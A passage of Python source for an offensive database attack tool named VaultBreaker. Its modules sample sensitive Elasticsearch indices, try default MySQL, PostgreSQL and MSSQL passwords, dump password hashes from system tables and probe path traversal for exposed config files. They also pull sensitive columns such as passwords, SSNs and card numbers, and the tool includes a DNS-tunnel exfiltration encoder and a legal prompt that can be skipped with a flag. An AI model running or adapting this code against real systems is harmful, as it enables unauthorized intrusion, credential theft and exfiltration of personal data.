            doc_count = idx.get("docs.count", "0")
            store_size = idx.get("store.size", "?")
            is_sensitive = any(kw in idx_name.lower() for kw in self.SENSITIVE_INDEX_KEYWORDS)
            if is_sensitive:
                sensitive_indices.append(idx_name)
                ctx.add_result(AttackResult(
                    "elastic", "Sensitive Index Detected", "critical", "high",
                    f"Index '{idx_name}' — {doc_count} docs, size: {store_size}"
                ))
        for idx_name in sensitive_indices[:5]:
            search_resp = _http_request(f"{base}/{idx_name}/_search?size=5", timeout=ctx.timeout)
            if search_resp and search_resp.status_code == 200:
                try:
                    hits = search_resp.json().get("hits", {}).get("hits", [])
                    if hits:
                        fields = list(hits[0].get("_source", {}).keys())
                        ctx.add_result(AttackResult(
                            "elastic", "Document Sampling", "ok", "critical",
                            f"{idx_name}: {len(hits)} docs sampled, fields: {', '.join(fields[:15])}"
                        ))
                except ValueError:
                    pass

    def _kibana_detection(self, ctx: EngagementContext, host: str):
        resp = _http_request(f"http://{host}:5601/api/status", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                version = data.get("version", {}).get("number", "unknown")
                ctx.add_result(AttackResult(
                    "elastic", "Kibana Detection", "critical", "high",
                    f"Kibana {version} detected at {host}:5601"
                ))
            except ValueError:
                ctx.add_result(AttackResult(
                    "elastic", "Kibana Detection", "ok", "medium",
                    f"Kibana responding at {host}:5601 (non-JSON response)"
                ))
        else:
            ctx.add_result(AttackResult("elastic", "Kibana Detection", "fail", "info",
                                        "Kibana not detected on port 5601"))

    def _snapshot_repos(self, ctx: EngagementContext, base: str):
        resp = _http_request(f"{base}/_snapshot", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            try:
                repos = resp.json()
                if repos:
                    repo_names = list(repos.keys())
                    ctx.add_result(AttackResult(
                        "elastic", "Snapshot Repositories", "ok", "high",
                        f"Found {len(repo_names)} snapshot repos: {', '.join(repo_names[:10])}"
                    ))
                    for repo_name in repo_names[:3]:
                        repo_type = repos[repo_name].get("type", "?")
                        repo_settings = repos[repo_name].get("settings", {})
                        ctx.add_result(AttackResult(
                            "elastic", "Snapshot Repo Details", "ok", "medium",
                            f"{repo_name}: type={repo_type}, location={repo_settings.get('location', '?')}"
                        ))
            except ValueError:
                pass

    def _security_plugins(self, ctx: EngagementContext, base: str):
        resp = _http_request(f"{base}/_xpack", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            try:
                xpack = resp.json()
                security = xpack.get("features", {}).get("security", {})
                ctx.add_result(AttackResult(
                    "elastic", "Security Plugin — X-Pack", "ok", "medium",
                    f"X-Pack security: enabled={security.get('enabled', '?')}, "
                    f"available={security.get('available', '?')}"
                ))
            except ValueError:
                pass
        resp = _http_request(f"{base}/_plugins/_security/api/account", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            ctx.add_result(AttackResult(
                "elastic", "Security Plugin — OpenSearch", "ok", "medium",
                "OpenSearch Security plugin detected"
            ))
        resp = _http_request(f"{base}/_searchguard/authinfo", timeout=ctx.timeout)
        if resp and resp.status_code == 200:
            ctx.add_result(AttackResult(
                "elastic", "Security Plugin — SearchGuard", "ok", "medium",
                "SearchGuard plugin detected"
            ))


# ─────────────────────────────────────────────────────────────
# Module 5: Credential Extraction
# ─────────────────────────────────────────────────────────────

class CredExtractModule:
    """Database credential extraction — default creds, hash dumping, connection string scanning."""

    NAME = "cred"

    MYSQL_DEFAULTS = [
        ("root", "root"), ("root", "mysql"), ("root", "password"),
        ("root", ""), ("admin", "admin"), ("mysql", "mysql"),
        ("root", "toor"), ("root", "123456"), ("dbadmin", "dbadmin"),
    ]

    POSTGRES_DEFAULTS = [
        ("postgres", "postgres"), ("postgres", "password"), ("admin", "admin"),
        ("postgres", ""), ("postgres", "123456"), ("pgsql", "pgsql"),
    ]

    MSSQL_DEFAULTS = [
        ("sa", "sa"), ("sa", "password"), ("sa", ""),
        ("sa", "Password1"), ("sa", "sa123"), ("sa", "123456"),
    ]

    CONN_STRING_PATTERNS = [
        r"jdbc:mysql://[\w\.\-]+(?::\d+)?/\w+",
        r"jdbc:postgresql://[\w\.\-]+(?::\d+)?/\w+",
        r"jdbc:sqlserver://[\w\.\-]+(?::\d+)?",
        r"mongodb://[\w\.\-:@]+(?:/\w+)?",
        r"redis://[\w\.\-:@]+(?:/\d+)?",
        r"postgresql://[\w\.\-:@]+(?:/\w+)?",
        r"mysql://[\w\.\-:@]+(?:/\w+)?",
        r"Server=[\w\.\-]+;.*(?:Password|Pwd)=\w+",
        r"Data Source=[\w\.\-]+;.*(?:Password|Pwd)=\w+",
    ]

    CRED_FILE_PATHS = [
        "/var/www/.env", "/var/www/html/.env", "/var/www/html/wp-config.php",
        "/opt/*/config.*", "/etc/*/database.*", "/var/www/html/configuration.php",
        "/var/www/html/config/database.php", "/var/www/html/app/config/parameters.yml",
        "/var/www/html/.git/config", "/home/*/.my.cnf", "/home/*/.pgpass",
        "/root/.my.cnf", "/root/.pgpass",
    ]

    def run(self, ctx: EngagementContext):
        console.print("\n[bold cyan]━━━ Credential Extraction Module ━━━[/bold cyan]")
        for target in ctx.targets:
            host = target.split("://")[-1].split("/")[0].split(":")[0]
            console.print(f"\n[bold blue][INFO][/bold blue] Target: {host}")
            if ctx.db_type in ("auto", "mysql"):
                self._mysql_defaults(ctx, host)
            if ctx.db_type in ("auto", "postgres"):
                self._postgres_defaults(ctx, host)
            if ctx.db_type in ("auto", "mssql"):
                self._mssql_defaults(ctx, host)
            if target.startswith("http"):
                self._connection_string_scan(ctx, target)
            self._cred_file_scan(ctx, target)

    def _mysql_defaults(self, ctx: EngagementContext, host: str):
        port = 3306
        for p in ctx.ports:
            if p in (3306, 3307):
                port = p
                break
        try:
            import mysql.connector
            for user, pwd in self.MYSQL_DEFAULTS:
                try:
                    conn = mysql.connector.connect(
                        host=host, port=port, user=user, password=pwd,
                        connection_timeout=ctx.timeout
                    )
                    ctx.add_result(AttackResult(
                        "cred", "MySQL Default Creds", "critical", "critical",
                        f"Login successful: {user}:{pwd}@{host}:{port}"
                    ))
                    ctx.add_credential(Credential("mysql-default", user, pwd, "", host, port))
                    try:
                        cursor = conn.cursor()
                        cursor.execute(
                            "SELECT user, host, authentication_string FROM mysql.user"
                        )
                        rows = cursor.fetchall()
                        for row in rows:
                            hash_val = row[2] if len(row) > 2 else ""
                            hash_preview = str(hash_val)[:40] + "..." if len(str(hash_val)) > 40 else str(hash_val)
                            ctx.add_result(AttackResult(
                                "cred", "MySQL Hash Extraction", "ok", "critical",
                                f"{row[0]}@{row[1]} hash={hash_preview}"
                            ))
                            if hash_val and str(hash_val).startswith("*"):
                                ctx.add_result(AttackResult(
                                    "cred", "Hash Format", "ok", "medium",
                                    f"{row[0]}: MySQL 4.1+ (SHA1) hash detected"
                                ))
                        cursor.close()
                    except Exception as e:
                        ctx.add_result(AttackResult("cred", "MySQL Hash Extraction", "fail", "low",
                                                    f"Cannot read mysql.user: {e}"))
                    conn.close()
                    return
                except mysql.connector.Error:
                    continue
            ctx.add_result(AttackResult("cred", "MySQL Default Creds", "fail", "info",
                                        f"No default credentials worked on {host}:{port}"))
        except ImportError:
            ctx.add_result(AttackResult("cred", "MySQL Default Creds", "fail", "info",
                                        "mysql-connector-python not installed"))

    def _postgres_defaults(self, ctx: EngagementContext, host: str):
        port = 5432
        for p in ctx.ports:
            if p in (5432, 5433):
                port = p
                break
        try:
            import psycopg2
            for user, pwd in self.POSTGRES_DEFAULTS:
                try:
                    conn = psycopg2.connect(
                        host=host, port=port, user=user, password=pwd,
                        connect_timeout=ctx.timeout, dbname="postgres"
                    )
                    ctx.add_result(AttackResult(
                        "cred", "PostgreSQL Default Creds", "critical", "critical",
                        f"Login successful: {user}:{pwd}@{host}:{port}"
                    ))
                    ctx.add_credential(Credential("postgres-default", user, pwd, "postgres", host, port))
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT usename, passwd FROM pg_shadow")
                        rows = cursor.fetchall()
                        for row in rows:
                            hash_val = row[1] if len(row) > 1 else ""
                            hash_preview = str(hash_val)[:40] if hash_val else "N/A"
                            ctx.add_result(AttackResult(
                                "cred", "PostgreSQL Hash Extraction", "ok", "critical",
                                f"{row[0]} hash={hash_preview}"
                            ))
                            if hash_val and str(hash_val).startswith("md5"):
                                ctx.add_result(AttackResult(
                                    "cred", "Hash Format", "ok", "medium",
                                    f"{row[0]}: PostgreSQL MD5 hash detected"
                                ))
                        cursor.close()
                    except Exception as e:
                        ctx.add_result(AttackResult("cred", "PostgreSQL Hash Extraction", "fail", "low",
                                                    f"Cannot read pg_shadow: {e}"))
                    conn.close()
                    return
                except psycopg2.OperationalError:
                    continue
            ctx.add_result(AttackResult("cred", "PostgreSQL Default Creds", "fail", "info",
                                        f"No default credentials worked on {host}:{port}"))
        except ImportError:
            ctx.add_result(AttackResult("cred", "PostgreSQL Default Creds", "fail", "info",
                                        "psycopg2 not installed"))

    def _mssql_defaults(self, ctx: EngagementContext, host: str):
        port = 1433
        for p in ctx.ports:
            if p in (1433, 1434):
                port = p
                break
        try:
            import pymssql
            for user, pwd in self.MSSQL_DEFAULTS:
                try:
                    conn = pymssql.connect(
                        server=host, port=str(port), user=user, password=pwd,
                        login_timeout=ctx.timeout
                    )
                    ctx.add_result(AttackResult(
                        "cred", "MSSQL Default Creds", "critical", "critical",
                        f"Login successful: {user}:{pwd}@{host}:{port}"
                    ))
                    ctx.add_credential(Credential("mssql-default", user, pwd, "master", host, port))
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT name, password_hash FROM sys.sql_logins")
                        rows = cursor.fetchall()
                        for row in rows:
                            hash_val = row[1] if len(row) > 1 else b""
                            if isinstance(hash_val, bytes):
                                hash_hex = hash_val.hex()[:40] + "..."
                            else:
                                hash_hex = str(hash_val)[:40]
                            ctx.add_result(AttackResult(
                                "cred", "MSSQL Hash Extraction", "ok", "critical",
                                f"{row[0]} hash=0x{hash_hex}"
                            ))
                        cursor.close()
                    except Exception as e:
                        ctx.add_result(AttackResult("cred", "MSSQL Hash Extraction", "fail", "low",
                                                    f"Cannot read sys.sql_logins: {e}"))
                    conn.close()
                    return
                except pymssql.OperationalError:
                    continue
                except pymssql.InterfaceError:
                    continue
            ctx.add_result(AttackResult("cred", "MSSQL Default Creds", "fail", "info",
                                        f"No default credentials worked on {host}:{port}"))
        except ImportError:
            ctx.add_result(AttackResult("cred", "MSSQL Default Creds", "fail", "info",
                                        "pymssql not installed"))

    def _connection_string_scan(self, ctx: EngagementContext, url: str):
        resp = _http_request(url, timeout=ctx.timeout)
        if not resp or not resp.text:
            return
        body = resp.text
        found = []
        for pattern in self.CONN_STRING_PATTERNS:
            matches = re.findall(pattern, body, re.IGNORECASE)
            found.extend(matches)
        if found:
            for conn_str in found[:10]:
                ctx.add_result(AttackResult(
                    "cred", "Connection String Found", "critical", "critical",
                    f"Exposed connection string: {conn_str[:100]}"
                ))
        else:
            ctx.add_result(AttackResult("cred", "Connection String Scan", "ok", "info",
                                        "No connection strings found in response"))

    def _cred_file_scan(self, ctx: EngagementContext, target: str):
        if not target.startswith("http"):
            return
        parsed = urllib.parse.urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        traversal_prefixes = ["", "../", "../../", "../../../"]
        test_files = [".env", "wp-config.php", "configuration.php",
                      "config/database.php", ".git/config", "web.config"]
        found_any = False
        for prefix in traversal_prefixes:
            for fname in test_files:
                test_url = f"{base}/{prefix}{fname}"
                resp = _http_request(test_url, timeout=ctx.timeout)
                if resp and resp.status_code == 200 and len(resp.text or "") > 20:
                    body = resp.text
                    cred_indicators = [
                        "DB_PASSWORD", "DB_HOST", "database_password", "mysql",
                        "postgres", "password", "SQLSERVER", "mongodb",
                    ]
                    if any(ind.lower() in body.lower() for ind in cred_indicators):
                        ctx.add_result(AttackResult(
                            "cred", "Credential File Exposed", "critical", "critical",
                            f"Config file accessible: {test_url}"
                        ))
                        for pattern in self.CONN_STRING_PATTERNS:
                            matches = re.findall(pattern, body, re.IGNORECASE)
                            for m in matches[:5]:
                                ctx.add_result(AttackResult(
                                    "cred", "Credential in Config", "ok", "critical",
                                    f"Extracted: {m[:100]}"
                                ))
                        found_any = True
        if not found_any:
            ctx.add_result(AttackResult("cred", "Credential File Scan", "ok", "info",
                                        "No exposed config files found via common paths"))


# ─────────────────────────────────────────────────────────────
# Module 6: Data Exfiltration
# ─────────────────────────────────────────────────────────────

class ExfilModule:
    """Data exfiltration — enumeration, sensitive column detection, selective extraction, DNS exfil."""

    NAME = "exfil"

    SENSITIVE_COLUMN_KEYWORDS = [
        "password", "passwd", "pwd", "credit_card", "creditcard", "cc_number",
        "ssn", "social_security", "email", "phone", "address", "token",
        "secret", "api_key", "apikey", "private", "private_key", "salt",
        "hash", "session", "cookie", "auth", "credential", "bank",
    ]

    def run(self, ctx: EngagementContext):
        console.print("\n[bold cyan]━━━ Exfiltration Module ━━━[/bold cyan]")
        for cred in ctx.credentials:
            console.print(f"\n[bold blue][INFO][/bold blue] Using credential: "
                          f"{cred.username}@{cred.host}:{cred.port} ({cred.source})")
            if "mysql" in cred.source:
                self._exfil_mysql(ctx, cred)
            elif "postgres" in cred.source:
                self._exfil_postgres(ctx, cred)
            elif "mssql" in cred.source:
                self._exfil_mssql(ctx, cred)
        if not ctx.credentials:
            ctx.add_result(AttackResult("exfil", "Exfiltration", "fail", "info",
                                        "No credentials available — run cred module first"))

    def _exfil_mysql(self, ctx: EngagementContext, cred: Credential):
        try:
            import mysql.connector
            conn = mysql.connector.connect(
                host=cred.host, port=cred.port,
                user=cred.username, password=cred.password,
                connection_timeout=ctx.timeout
            )
            cursor = conn.cursor()
            cursor.execute("SHOW DATABASES")
            databases = [row[0] for row in cursor.fetchall()]
            ctx.add_result(AttackResult(
                "exfil", "MySQL Database Enumeration", "ok", "high",
                f"Found {len(databases)} databases: {', '.join(databases[:15])}"
            ))
            for db_name in databases:
                if db_name in ("information_schema", "performance_schema", "sys"):
                    continue
                try:
                    cursor.execute(f"USE `{db_name}`")
                    cursor.execute("SHOW TABLES")
                    tables = [row[0] for row in cursor.fetchall()]
                    for table in tables:
                        cursor.execute(f"SHOW COLUMNS FROM `{table}`")
                        columns = [row[0] for row in cursor.fetchall()]
                        sensitive = [c for c in columns
                                     if any(kw in c.lower() for kw in self.SENSITIVE_COLUMN_KEYWORDS)]
                        if sensitive:
                            cursor.execute(f"SELECT COUNT(*) FROM `{table}`")
                            row_count = cursor.fetchone()[0]
                            ctx.add_result(AttackResult(
                                "exfil", "Sensitive Data Detected", "critical", "critical",
                                f"{db_name}.{table}: {row_count} rows, "
                                f"sensitive columns: {', '.join(sensitive)}"
                            ))
                            if sensitive and row_count > 0:
                                cols_str = ", ".join(f"`{c}`" for c in sensitive[:5])
                                cursor.execute(f"SELECT {cols_str} FROM `{table}` LIMIT 5")
                                sample_rows = cursor.fetchall()
                                for i, row in enumerate(sample_rows):
                                    preview = {sensitive[j]: str(v)[:50] for j, v in enumerate(row)
                                               if j < len(sensitive)}
                                    ctx.add_result(AttackResult(
                                        "exfil", "Data Sample", "ok", "critical",
                                        f"{db_name}.{table} row {i+1}: {json.dumps(preview)}"
                                    ))
                except Exception:
                    pass
            cursor.close()
            conn.close()
        except ImportError:
            ctx.add_result(AttackResult("exfil", "MySQL Exfiltration", "fail", "info",
                                        "mysql-connector-python not installed"))
        except Exception as e:
            ctx.add_result(AttackResult("exfil", "MySQL Exfiltration", "fail", "low",
                                        f"Error: {e}"))

    def _exfil_postgres(self, ctx: EngagementContext, cred: Credential):
        try:
            import psycopg2
            conn = psycopg2.connect(
                host=cred.host, port=cred.port,
                user=cred.username, password=cred.password,
                dbname="postgres", connect_timeout=ctx.timeout
            )
            cursor = conn.cursor()
            cursor.execute(
                "SELECT datname FROM pg_database WHERE datistemplate = false"
            )
            databases = [row[0] for row in cursor.fetchall()]
            ctx.add_result(AttackResult(
                "exfil", "PostgreSQL Database Enumeration", "ok", "high",
                f"Found {len(databases)} databases: {', '.join(databases[:15])}"
            ))
            cursor.close()
            conn.close()
            for db_name in databases:
                try:
                    conn = psycopg2.connect(
                        host=cred.host, port=cred.port,
                        user=cred.username, password=cred.password,
                        dbname=db_name, connect_timeout=ctx.timeout
                    )
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT table_schema, table_name FROM information_schema.tables "
                        "WHERE table_schema NOT IN ('pg_catalog', 'information_schema')"
                    )
                    tables = cursor.fetchall()
                    for schema, table in tables:
                        cursor.execute(
                            "SELECT column_name FROM information_schema.columns "
                            f"WHERE table_schema = '{schema}' AND table_name = '{table}'"
                        )
                        columns = [row[0] for row in cursor.fetchall()]
                        sensitive = [c for c in columns
                                     if any(kw in c.lower() for kw in self.SENSITIVE_COLUMN_KEYWORDS)]
                        if sensitive:
                            cursor.execute(f'SELECT COUNT(*) FROM "{schema}"."{table}"')
                            row_count = cursor.fetchone()[0]
                            ctx.add_result(AttackResult(
                                "exfil", "Sensitive Data Detected", "critical", "critical",
                                f"{db_name}.{schema}.{table}: {row_count} rows, "
                                f"sensitive columns: {', '.join(sensitive)}"
                            ))
                            if row_count > 0:
                                cols_str = ", ".join(f'"{c}"' for c in sensitive[:5])
                                cursor.execute(
                                    f'SELECT {cols_str} FROM "{schema}"."{table}" LIMIT 5'
                                )
                                sample_rows = cursor.fetchall()
                                for i, row in enumerate(sample_rows):
                                    preview = {sensitive[j]: str(v)[:50] for j, v in enumerate(row)
                                               if j < len(sensitive)}
                                    ctx.add_result(AttackResult(
                                        "exfil", "Data Sample", "ok", "critical",
                                        f"{db_name}.{schema}.{table} row {i+1}: {json.dumps(preview)}"
                                    ))
                    cursor.close()
                    conn.close()
                except Exception:
                    pass
        except ImportError:
            ctx.add_result(AttackResult("exfil", "PostgreSQL Exfiltration", "fail", "info",
                                        "psycopg2 not installed"))
        except Exception as e:
            ctx.add_result(AttackResult("exfil", "PostgreSQL Exfiltration", "fail", "low",
                                        f"Error: {e}"))

    def _exfil_mssql(self, ctx: EngagementContext, cred: Credential):
        try:
            import pymssql
            conn = pymssql.connect(
                server=cred.host, port=str(cred.port),
                user=cred.username, password=cred.password,
                login_timeout=ctx.timeout
            )
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sys.databases")
            databases = [row[0] for row in cursor.fetchall()]
            ctx.add_result(AttackResult(
                "exfil", "MSSQL Database Enumeration", "ok", "high",
                f"Found {len(databases)} databases: {', '.join(databases[:15])}"
            ))
            for db_name in databases:
                if db_name in ("master", "tempdb", "model", "msdb"):
                    continue
                try:
                    cursor.execute(f"USE [{db_name}]")
                    cursor.execute(
                        "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
                        "WHERE TABLE_TYPE = 'BASE TABLE'"
                    )
                    tables = cursor.fetchall()
                    for schema, table in tables:
                        cursor.execute(
                            "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS "
                            f"WHERE TABLE_SCHEMA = '{schema}' AND TABLE_NAME = '{table}'"
                        )
                        columns = [row[0] for row in cursor.fetchall()]
                        sensitive = [c for c in columns
                                     if any(kw in c.lower() for kw in self.SENSITIVE_COLUMN_KEYWORDS)]
                        if sensitive:
                            cursor.execute(f"SELECT COUNT(*) FROM [{schema}].[{table}]")
                            row_count = cursor.fetchone()[0]
                            ctx.add_result(AttackResult(
                                "exfil", "Sensitive Data Detected", "critical", "critical",
                                f"{db_name}.{schema}.{table}: {row_count} rows, "
                                f"sensitive columns: {', '.join(sensitive)}"
                            ))
                            if row_count > 0:
                                cols_str = ", ".join(f"[{c}]" for c in sensitive[:5])
                                cursor.execute(
                                    f"SELECT TOP 5 {cols_str} FROM [{schema}].[{table}]"
                                )
                                sample_rows = cursor.fetchall()
                                for i, row in enumerate(sample_rows):
                                    preview = {sensitive[j]: str(v)[:50] for j, v in enumerate(row)
                                               if j < len(sensitive)}
                                    ctx.add_result(AttackResult(
                                        "exfil", "Data Sample", "ok", "critical",
                                        f"{db_name}.{schema}.{table} row {i+1}: {json.dumps(preview)}"
                                    ))
                except Exception:
                    pass
            cursor.close()
            conn.close()
        except ImportError:
            ctx.add_result(AttackResult("exfil", "MSSQL Exfiltration", "fail", "info",
                                        "pymssql not installed"))
        except Exception as e:
            ctx.add_result(AttackResult("exfil", "MSSQL Exfiltration", "fail", "low",
                                        f"Error: {e}"))

    @staticmethod
    def dns_exfil_encode(data: str, domain: str, chunk_size: int = 30) -> List[str]:
        """Encode data as DNS subdomain queries (base32 chunks)."""
        encoded = base64.b32encode(data.encode()).decode().rstrip("=").lower()
        queries = []
        for i in range(0, len(encoded), chunk_size):
            chunk = encoded[i:i + chunk_size]
            queries.append(f"{chunk}.{i // chunk_size}.{domain}")
        return queries

    @staticmethod
    def export_csv(data: List[Dict], filepath: str):
        """Export extracted data to CSV."""
        if not data:
            return
        fieldnames = list(data[0].keys())
        with open(filepath, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(data)


# ─────────────────────────────────────────────────────────────
# Module registry
# ─────────────────────────────────────────────────────────────

MODULE_MAP = {
    "sqli": SQLiModule,
    "mongo": MongoModule,
    "redis": RedisModule,
    "elastic": ElasticModule,
    "cred": CredExtractModule,
    "exfil": ExfilModule,
}


# ─────────────────────────────────────────────────────────────
# Banner and legal
# ─────────────────────────────────────────────────────────────

def print_banner():
    banner = pyfiglet.figlet_format("VaultBreaker", font="slant")
    console.print(f"[bold red]{banner}[/bold red]", end="")
    console.print(f"[bold white]  {TOOL_NAME} v{VERSION}[/bold white]")
    console.print("[dim]  Database Offensive Framework[/dim]")
    console.print("[dim]  SQL Injection | MongoDB | Redis | Elasticsearch | Credential Extraction | Exfiltration[/dim]\n")


def legal_warning() -> bool:
    console.print(Panel(
        "[bold red]LEGAL NOTICE[/bold red]\n\n"
        "This tool is designed for authorized security assessments only.\n"
        "Unauthorized access to computer systems is illegal under:\n\n"
        "  - Computer Fraud and Abuse Act (CFAA) — 18 U.S.C. 1030\n"
        "  - Computer Misuse Act 1990 (UK)\n"
        "  - EU Directive 2013/40/EU on attacks against information systems\n"
        "  - Equivalent legislation in your jurisdiction\n\n"
        "You must have explicit written authorization before running this tool\n"
        "against any target. The operator assumes full legal responsibility.\n\n"
        "[bold yellow]Do you have written authorization to test these targets?[/bold yellow]",
        title="[bold red]WARNING[/bold red]",
        border_style="red",
    ))
    try:
        response = input("\n  [y/N] → ").strip().lower()
        return response in ("y", "yes")
    except (EOFError, KeyboardInterrupt):
        return False


# ─────────────────────────────────────────────────────────────
# Summary
# ─────────────────────────────────────────────────────────────

def print_summary(ctx: EngagementContext):
    console.print("\n")
    table = Table(title="Engagement Summary", show_header=True, header_style="bold magenta")
    table.add_column("Metric", style="cyan")
    table.add_column("Value", style="white")
    total = len(ctx.results)
    critical = sum(1 for r in ctx.results if r.severity == "critical")
    high = sum(1 for r in ctx.results if r.severity == "high")
    medium = sum(1 for r in ctx.results if r.severity == "medium")
    low = sum(1 for r in ctx.results if r.severity == "low")
    info = sum(1 for r in ctx.results if r.severity == "info")
    creds = len(ctx.credentials)
    table.add_row("Total Findings", str(total))
    table.add_row("Critical", f"[bold red]{critical}[/bold red]")
    table.add_row("High", f"[red]{high}[/red]")
    table.add_row("Medium", f"[yellow]{medium}[/yellow]")
    table.add_row("Low", f"[blue]{low}[/blue]")
    table.add_row("Info", f"[dim]{info}[/dim]")
    table.add_row("Credentials Extracted", f"[bold magenta]{creds}[/bold magenta]")
    console.print(table)
    if ctx.credentials:
        cred_table = Table(title="Extracted Credentials", show_header=True,
                           header_style="bold red")
        cred_table.add_column("Source", style="cyan")
        cred_table.add_column("Username", style="white")
        cred_table.add_column("Password", style="red")
        cred_table.add_column("Host:Port", style="yellow")
        cred_table.add_column("Database", style="green")
        for c in ctx.credentials:
            cred_table.add_row(c.source, c.username, c.password,
                               f"{c.host}:{c.port}", c.database)
        console.print(cred_table)


# ─────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        prog=COMMAND,
        description=f"{TOOL_NAME} v{VERSION} — Database Offensive Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  vaultbreaker --targets 10.0.0.5 --modules sqli
  vaultbreaker --targets app.corp.local --modules sqli,cred,exfil --db-type mysql
  vaultbreaker --targets 10.0.0.0/24 --ports 27017,6379,9200 --modules mongo,redis,elastic
  vaultbreaker --targets 10.0.0.5 --modules all --output report.json --yes
        """,
    )
    parser.add_argument("--targets", "-t", required=True,
                        help="Comma-separated target hosts or URLs")
    parser.add_argument("--ports", "-p", default="",
                        help="Comma-separated ports (default: auto per module)")
    parser.add_argument("--modules", "-m", default="all",
                        help="Modules: sqli,mongo,redis,elastic,cred,exfil,all (default: all)")
    parser.add_argument("--output", "-o", default=None,
                        help="Output JSON report file")
    parser.add_argument("--yes", "-y", action="store_true",
                        help="Skip legal warning")
    parser.add_argument("--threads", default=10, type=int,
                        help="Number of threads (default: 10)")
    parser.add_argument("--timeout", default=10, type=int,
                        help="Connection timeout in seconds (default: 10)")
    parser.add_argument("--db-type", default="auto",
                        choices=["auto", "mysql", "mssql", "postgres", "mongo", "redis", "elastic"],
                        help="Target database type (default: auto)")
    parser.add_argument("--version", "-V", action="version",
                        version=f"{TOOL_NAME} v{VERSION}")

    args = parser.parse_args()

    print_banner()

    if not args.yes:
        if not legal_warning():
            console.print("\n[bold red]Aborted.[/bold red] Authorization not confirmed.")
            sys.exit(1)

    targets = [t.strip() for t in args.targets.split(",") if t.strip()]
    ports = [int(p.strip()) for p in args.ports.split(",") if p.strip().isdigit()]

    ctx = EngagementContext(
        targets=targets,
        ports=ports,
        threads=args.threads,
        timeout=args.timeout,
        output_file=args.output,
        db_type=args.db_type,
    )

    module_names = args.modules.lower().split(",")
    if "all" in module_names:
        module_names = list(MODULE_MAP.keys())

    console.print(f"[bold blue][INFO][/bold blue] Targets: {', '.join(targets)}")
    console.print(f"[bold blue][INFO][/bold blue] Ports: {ports if ports else 'auto'}")
    console.print(f"[bold blue][INFO][/bold blue] Modules: {', '.join(module_names)}")
    console.print(f"[bold blue][INFO][/bold blue] DB Type: {ctx.db_type}")
    console.print(f"[bold blue][INFO][/bold blue] Timeout: {ctx.timeout}s")

    start_time = time.time()

    for mod_name in module_names:
        mod_name = mod_name.strip()
        if mod_name not in MODULE_MAP:
            console.print(f"[bold yellow][WARN][/bold yellow] Unknown module: {mod_name}")
            continue
        module_cls = MODULE_MAP[mod_name]
        module = module_cls()
        try:
            module.run(ctx)
        except KeyboardInterrupt:
            console.print(f"\n[bold yellow][WARN][/bold yellow] Module {mod_name} interrupted")
        except Exception as e:
            console.print(f"[bold red][CRIT][/bold red] Module {mod_name} error: {e}")
            ctx.add_result(AttackResult(mod_name, "Module Error", "fail", "info", str(e)))

    elapsed = time.time() - start_time

    print_summary(ctx)
    console.print(f"\n[bold blue][INFO][/bold blue] Completed in {elapsed:.1f}s")

    ctx.export()


if __name__ == "__main__":
    main()
